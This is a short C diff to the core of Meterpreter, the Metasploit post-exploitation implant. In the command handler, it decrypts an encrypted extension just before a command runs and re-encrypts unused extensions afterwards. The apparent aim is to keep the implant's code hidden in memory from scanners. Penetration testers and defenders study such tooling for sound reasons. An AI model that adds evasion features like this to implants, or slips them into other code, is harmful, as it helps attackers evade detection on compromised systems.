@@ -3,6 +3,7 @@
  * @brief Definitions that apply to almost any Meterpreter component.
  */
 #include "metsrv.h"
+#include "extension_encryption.h"
 
 // TODO: move these to a header?
 // Local remote request implementors
@@ -426,6 +427,7 @@ BOOL command_handle(Remote *remote, Packet *packet)
 
 	UINT commandId = packet_get_tlv_value_uint(packet, TLV_TYPE_COMMAND_ID);
 
+	ExtensionEncryptionManager* encryptionManager = GetExtensionEncryptionManager();
 	do
 	{
 
@@ -455,6 +457,21 @@ BOOL command_handle(Remote *remote, Packet *packet)
 			break;
 		}
 
+
+		if(command != NULL && encryptionManager != NULL) {
+			ExtensionEncryptionStatus* extStatus = NULL;
+			if(encryptionManager->get((LPVOID)command, &extStatus)) {
+				if(extStatus != NULL && extStatus->bEncrypted) {
+					dprintf("[COMMAND] Decrypting Extension having command %u", commandId);
+					if(encryptionManager->decrypt(extStatus)){
+						dprintf("[COMMAND] Extension Decrypted!");
+					} else {
+						dprintf("[COMMAND] Extension Decryption failed!");
+					}
+				}
+			}
+		}
+
 		// if either command is registered as inline, run them inline
 		if ((command && command_is_inline(command, packet))
 			|| packet->local)
@@ -474,6 +491,10 @@ BOOL command_handle(Remote *remote, Packet *packet)
 				thread_run(cpt);
 			}
 		}
+		if(encryptionManager != NULL) {
+			encryptionManager->encryptUnused();
+		}
+
 	} while (0);
 
 	return result;
